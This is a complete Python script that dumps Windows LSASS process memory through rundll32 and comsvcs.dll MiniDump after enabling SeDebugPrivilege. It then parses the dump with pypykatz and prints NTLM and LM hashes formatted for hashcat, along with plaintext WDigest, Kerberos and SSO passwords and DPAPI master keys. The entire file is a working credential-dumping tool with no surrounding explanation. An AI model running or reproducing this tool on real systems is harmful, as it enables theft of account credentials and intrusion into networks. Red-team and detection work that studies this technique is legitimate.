#!/usr/bin/env python3
"""
lsass_dump.py - Dumps LSASS memory via comsvcs.dll MiniDump, then parses
offline for credential material (NTLM hashes, plaintext passwords, Kerberos keys).
Requires: pypykatz, running as Administrator for the dump step.
"""

import os
import sys
import ctypes
import struct
import subprocess
import tempfile
import argparse
import re
from pathlib import Path

try:
    from pypykatz.pypykatz import pypykatz
    from pypykatz.commons.common import UniversalEncoder
except ImportError:
    print("[!] pypykatz not installed. Install with: pip install pypykatz", file=sys.stderr)
    sys.exit(1)

try:
    import psutil
except ImportError:
    print("[!] psutil not installed. Install with: pip install psutil", file=sys.stderr)
    sys.exit(1)


def is_admin() -> bool:
    """Check if running with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return os.getuid() == 0


def enable_debug_privilege() -> bool:
    """Enable SeDebugPrivilege for the current process."""
    import win32security
    import win32api
    import win32con
    import ntsecuritycon

    try:
        h_token = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )

        luid = win32security.LookupPrivilegeValue(
            None, ntsecuritycon.SE_DEBUG_NAME
        )

        new_state = [(luid, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(h_token, False, new_state)

        return True
    except Exception as e:
        print(f"[!] Failed to enable SeDebugPrivilege: {e}", file=sys.stderr)
        return False


def get_lsass_pid() -> int:
    """Find the PID of lsass.exe."""
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == 'lsass.exe':
                return proc.info['pid']
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    raise RuntimeError("lsass.exe process not found")


def dump_lsass(output_path: str) -> bool:
    """Dump LSASS memory using rundll32.exe with comsvcs.dll MiniDump."""
    lsass_pid = get_lsass_pid()
    print(f"[*] Found lsass.exe PID: {lsass_pid}")

    cmd = [
        "rundll32.exe",
        "C:\\Windows\\System32\\comsvcs.dll",
        "MiniDump",
        str(lsass_pid),
        output_path,
        "full"
    ]

    print(f"[*] Executing: {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
        )
        if result.returncode != 0:
            print(f"[!] rundll32 returned non-zero exit code: {result.returncode}", file=sys.stderr)
            if result.stderr:
                print(f"    stderr: {result.stderr.strip()}", file=sys.stderr)
        if not os.path.exists(output_path):
            print(f"[!] Dump file not created at {output_path}", file=sys.stderr)
            return False
        if os.path.getsize(output_path) == 0:
            print(f"[!] Dump file is empty", file=sys.stderr)
            return False
        print(f"[+] LSASS dump saved to: {output_path} ({os.path.getsize(output_path)} bytes)")
        return True
    except subprocess.TimeoutExpired:
        print("[!] rundll32 timed out", file=sys.stderr)
        return False
    except Exception as e:
        print(f"[!] Failed to execute dump command: {e}", file=sys.stderr)
        return False


def parse_dump(dump_path: str):
    """Parse the LSASS minidump for credentials using pypykatz."""
    print(f"[*] Parsing dump file: {dump_path}")

    try:
        pypy = pypykatz.parse_minidump_file(dump_path)
    except Exception as e:
        print(f"[!] Failed to parse minidump: {e}", file=sys.stderr)
        return

    # Iterate all logon sessions
    for luid, session in pypy.logon_sessions.items():
        print(f"\n{'='*60}")
        print(f"[*] Logon Session: {luid}")
        print(f"    Username:     {session.username}")
        print(f"    Domain:       {session.domain}")
        print(f"    SID:          {session.SID}")
        print(f"    Logon Server: {session.logon_server}")
        print(f"    Logon Time:   {session.logon_time}")
        print(f"    Logon Type:   {session.logon_type}")

        # MSV credentials (LM, NT, SHA1 hashes)
        if session.msv_creds:
            print(f"\n[+] MSV Credentials:")
            for cred in session.msv_creds:
                print(f"    Username:  {cred.username}")
                print(f"    Domain:    {cred.domainname}")
                print(f"    LM Hash:   {cred.LMHash.hex() if cred.LMHash else 'N/A'}")
                print(f"    NT Hash:   {cred.NThash.hex() if cred.NThash else 'N/A'}")
                print(f"    SHA1 Hash: {cred.SHAHash.hex() if cred.SHAHash else 'N/A'}")

                # Format for hashcat/john
                if cred.NThash:
                    nthash_hex = cred.NThash.hex()
                    print(f"    [hashcat]  {cred.username}:::{nthash_hex}")
                    if cred.LMHash:
                        lmhash_hex = cred.LMHash.hex()
                        print(f"    [hashcat]  {cred.username}:{cred.domainname}:{lmhash_hex}:{nthash_hex}:::")

        # WDigest credentials (plaintext passwords)
        if session.wdigest_creds:
            print(f"\n[+] WDigest Credentials:")
            for cred in session.wdigest_creds:
                if cred.password:
                    print(f"    Username:  {cred.username}")
                    print(f"    Domain:    {cred.domainname}")
                    print(f"    Password:  {cred.password}  <-- PLAINTEXT")
                else:
                    print(f"    Username:  {cred.username}")
                    print(f"    Domain:    {cred.domainname}")
                    print(f"    Password:  (none)")

        # Kerberos keys
        if session.kerberos_creds:
            print(f"\n[+] Kerberos Credentials:")
            for cred in session.kerberos_creds:
                print(f"    Username:  {cred.username}")
                print(f"    Domain:    {cred.domainname}")
                if cred.password:
                    print(f"    Password:  {cred.password}")

        # TSPkg credentials
        if session.tspkg_creds:
            print(f"\n[+] TSPkg Credentials:")
            for cred in session.tspkg_creds:
                print(f"    Username:  {cred.username}")
                print(f"    Domain:    {cred.domainname}")
                if cred.password:
                    print(f"    Password:  {cred.password}")

        # LiveSSP credentials
        if session.livessp_creds:
            print(f"\n[+] LiveSSP Credentials:")
            for cred in session.livessp_creds:
                print(f"    Username:  {cred.username}")
                print(f"    Domain:    {cred.domainname}")
                if cred.password:
                    print(f"    Password:  {cred.password}")

        # SSO credentials
        if session.sso_creds:
            print(f"\n[+] SSO Credentials:")
            for cred in session.sso_creds:
                print(f"    Username:  {cred.username}")
                print(f"    Domain:    {cred.domainname}")
                if cred.password:
                    print(f"    Password:  {cred.password}")

        # DPAPI master keys
        if session.dpapi_creds:
            print(f"\n[+] DPAPI Master Keys ({len(session.dpapi_creds)} found):")
            for cred in session.dpapi_creds:
                print(f"    GUID:      {cred.key_guid}")
                print(f"    Key:       {cred.key.hex() if cred.key else 'N/A'}")

    print(f"\n{'='*60}")
    print("[*] Parse complete.")


def main():
    parser = argparse.ArgumentParser(
        description="Dump LSASS memory and parse for credentials."
    )
    parser.add_argument(
        "-o", "--output",
        default=None,
        help="Output path for the dump file (default: temp file in %TEMP%)"
    )
    parser.add_argument(
        "-p", "--parse-only",
        default=None,
        help="Parse an existing dump file without dumping (skip dump step)"
    )
    parser.add_argument(
        "-k", "--keep-dump",
        action="store_true",
        help="Keep the dump file after parsing (default: delete temp dump)"
    )

    args = parser.parse_args()

    dump_path = None
    temp_created = False

    if args.parse_only:
        if not os.path.exists(args.parse_only):
            print(f"[!] Dump file not found: {args.parse_only}", file=sys.stderr)
            sys.exit(1)
        dump_path = args.parse_only
    else:
        if not is_admin():
            print("[!] Administrator privileges required to dump LSASS.", file=sys.stderr)
            print("[!] Run this script as Administrator, or use --parse-only on an existing dump.", file=sys.stderr)
            sys.exit(1)

        enable_debug_privilege()

        if args.output:
            dump_path = args.output
        else:
            fd, dump_path = tempfile.mkstemp(suffix=".dmp", prefix="lsass_")
            os.close(fd)
            temp_created = True

        if not dump_lsass(dump_path):
            print("[!] Dump failed.", file=sys.stderr)
            if temp_created and os.path.exists(dump_path):
                os.unlink(dump_path)
            sys.exit(1)

    try:
        parse_dump(dump_path)
    finally:
        if temp_created and not args.keep_dump and dump_path and os.path.exists(dump_path):
            try:
                os.unlink(dump_path)
                print(f"[*] Deleted temporary dump: {dump_path}")
            except OSError:
                pass


if __name__ == "__main__":
    main()
